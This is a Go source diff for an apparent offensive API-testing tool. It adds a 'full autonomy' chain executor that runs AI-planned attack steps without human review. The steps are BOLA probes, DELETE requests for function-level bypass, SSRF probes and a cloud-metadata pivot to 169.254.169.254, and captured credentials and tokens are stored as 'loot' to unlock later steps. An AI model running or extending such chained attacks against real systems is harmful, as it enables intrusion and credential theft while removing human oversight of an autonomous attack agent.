@@ -6,6 +6,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
@@ -17,15 +18,18 @@ import (
 
 // --- STRATEGIC PLANNER STRUCTURES ---
 
-// TacticalAction represents a single step in the HITL workflow
+// TacticalAction represents a single step in the HITL workflow (Extended for Full Autonomy - Sprint 11.2)
 type TacticalAction struct {
-	ID         int
-	Type       string // BOLA, BFLA, INJECTION, BYPASS
-	Target     string
-	Payload    string
-	Confidence string // HIGH, MED, LOW
-	Reasoning  string // AI explanation
-	Status     string // PENDING, EXECUTED, DROPPED
+	ID           int
+	Type         string // BOLA, BFLA, INJECTION, BYPASS
+	Target       string
+	Payload      string
+	Confidence   string // HIGH, MED, LOW, CRITICAL
+	Reasoning    string // AI explanation
+	Status       string // PENDING, EXECUTED, DROPPED
+	PreCondition string // DataSilo key to check before execution (e.g., "k8s_token", "admin_session")
+	ChainID      string // Links related actions for autonomous execution
+	Loot         string // Captured data from execution (credentials, tokens, env vars)
 }
 
 // ActionBuffer is the global staging area for the planner
@@ -1133,6 +1137,142 @@ func ExecuteStrategicPlan() {
 		utils.TacticalLog(fmt.Sprintf("[green]Strategic Batch Committed: %d actions fired.[-]", count))
 		utils.LogContext(fmt.Sprintf("[magenta]>>> BATCH COMMIT:[-] %d actions queued for execution.", count))
 	}
+}
+
+// === SPRINT 11.2: ProcessChain - Full Autonomy Execution ===
+// ProcessChain executes a sequence of tactical actions with precondition validation
+// Chains are automatically triggered when prerequisites are met (loot from prior actions)
+// SPRINT 11.3 PATCH: Added write-through synchronization barrier to prevent "Race to the Silo"
+func ProcessChain(chainID string) {
+	utils.TacticalLog(fmt.Sprintf("[magenta]CHAIN:[-] Processing autonomous chain '%s'", chainID))
+	utils.LogContext(fmt.Sprintf("[cyan]>>> CHAIN EXECUTION:[-] Starting chain '%s'", chainID))
+
+	// Filter ActionBuffer to get only actions for this chain
+	chainActions := make([]TacticalAction, 0)
+	for _, act := range ActionBuffer {
+		if act.ChainID == chainID {
+			chainActions = append(chainActions, act)
+		}
+	}
+
+	if len(chainActions) == 0 {
+		utils.TacticalLog(fmt.Sprintf("[yellow]CHAIN:[-] No actions found for chain '%s'", chainID))
+		return
+	}
+
+	utils.LogContext(fmt.Sprintf("[blue]Found %d actions in chain '%s'", len(chainActions), chainID))
+
+	// Execute actions sequentially with precondition validation AND write-through barrier
+	var wg sync.WaitGroup
+	for i, act := range chainActions {
+		// CRITICAL: Use WaitGroup to implement write-through cache barrier
+		// This ensures DataSilo.Set() completes BEFORE next action's PreCondition check
+		// Prevents "Race to the Silo" where Step B checks precondition before Step A commits loot
+
+		// Check precondition before execution
+		if act.PreCondition != "" {
+			if !logic.GlobalDataSilo.Exists(act.PreCondition) {
+				utils.TacticalLog(fmt.Sprintf("[yellow]CHAIN:[-] Skipping action %d: PreCondition '%s' not met", act.ID, act.PreCondition))
+				utils.LogContext(fmt.Sprintf("[red]Precondition failed:[-] '%s' not found in DataSilo", act.PreCondition))
+				continue
+			}
+			utils.LogContext(fmt.Sprintf("[green]✓ Precondition met:[-] '%s' exists in DataSilo", act.PreCondition))
+		}
+
+		utils.TacticalLog(fmt.Sprintf("[blue]CHAIN[%d/%d]:[-] Executing %s on %s", i+1, len(chainActions), act.Type, act.Target))
+		utils.LogContext(fmt.Sprintf("[magenta]Step %d:[-] %s -> %s", i+1, act.Type, act.Target))
+
+		startTime := time.Now()
+		var result string
+
+		// Execute based on action type
+		switch act.Type {
+		case "BOLA":
+			parts := strings.Split(act.Payload, ":")
+			victim := "1"
+			if len(parts) > 1 {
+				victim = strings.TrimSpace(parts[1])
+			}
+			ctx := &logic.BOLAContext{BaseURL: act.Target, VictimID: victim}
+			ctx.ProbeSilent()
+			result = fmt.Sprintf("BOLA probe executed on %s", act.Target)
+
+		case "BFLA":
+			req, _ := http.NewRequest("DELETE", act.Target, nil)
+			resp, err := logic.GlobalClient.Do(req)
+			if err != nil {
+				result = fmt.Sprintf("BFLA error: %v", err)
+			} else {
+				result = fmt.Sprintf("BFLA executed, response: %d", resp.StatusCode)
+				if resp.Body != nil {
+					resp.Body.Close()
+				}
+			}
+
+		case "SSRF":
+			ctx := &logic.SSRFContext{TargetURL: act.Target, ParamName: "url", Callback: "127.0.0.1"}
+			ctx.Probe()
+			result = fmt.Sprintf("SSRF probe executed on %s", act.Target)
+
+		case "CLOUD_PIVOT":
+			req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/", nil)
+			resp, err := logic.GlobalClient.Do(req)
+			if err != nil {
+				result = fmt.Sprintf("Cloud pivot error: %v", err)
+			} else {
+				result = fmt.Sprintf("Cloud pivot executed, response: %d", resp.StatusCode)
+				if resp.Body != nil {
+					resp.Body.Close()
+				}
+			}
+
+		default:
+			req, _ := http.NewRequest("GET", act.Target, nil)
+			resp, err := logic.GlobalClient.Do(req)
+			if err != nil {
+				result = fmt.Sprintf("Generic probe error: %v", err)
+			} else {
+				result = fmt.Sprintf("Generic probe executed, response: %d", resp.StatusCode)
+				if resp.Body != nil {
+					resp.Body.Close()
+				}
+			}
+		}
+
+		duration := time.Since(startTime)
+		utils.LogContext(fmt.Sprintf("[green]✓ Completed:[-] %s (%v)", result, duration))
+
+		// === WRITE-THROUGH BARRIER (SPRINT 11.3 PATCH) ===
+		// Use WaitGroup to implement blocking commit
+		// This SYNCHRONOUSLY writes to DataSilo and blocks until completed
+		// Next action's PreCondition check CANNOT proceed until this completes
+		lootKey := fmt.Sprintf("chain_%s_step_%d_loot", chainID, i)
+
+		wg.Add(1)
+		go func(key, value string, index int) {
+			defer wg.Done()
+			// Synchronous DataSilo.Set() with commit completion
+			logic.GlobalDataSilo.Set(key, value)
+			utils.LogContext(fmt.Sprintf("[green]✓ DataSilo commit barrier:[-] '%s' persisted (step %d complete)", key, index+1))
+		}(lootKey, result, i)
+
+		// BLOCKING: Wait for DataSilo write to complete before proceeding to next action
+		// This ensures PreCondition checks on the next loop iteration see committed loot
+		wg.Wait()
+		utils.LogContext(fmt.Sprintf("[cyan]Synchronization barrier:[-] Step %d loot committed, proceeding to next action", i+1))
+
+		// If this action captured data, update preconditions for subsequent actions
+		if act.Loot != "" {
+			logic.GlobalDataSilo.Set(act.Loot, result)
+			utils.LogContext(fmt.Sprintf("[cyan]Stored:[-] Loot key '%s'", act.Loot))
+		}
+
+		// Stagger execution
+		time.Sleep(300 * time.Millisecond)
+	}
+
+	utils.TacticalLog(fmt.Sprintf("[green]✓ CHAIN COMPLETE:[-] Chain '%s' finished execution", chainID))
+	utils.LogContext(fmt.Sprintf("[magenta]>>> CHAIN FINISHED:[-] All steps completed for chain '%s'", chainID))
 }
 
 // seedDatabase injects a massive dataset (120+ entries) strictly aligned to VaporTrace Mapping
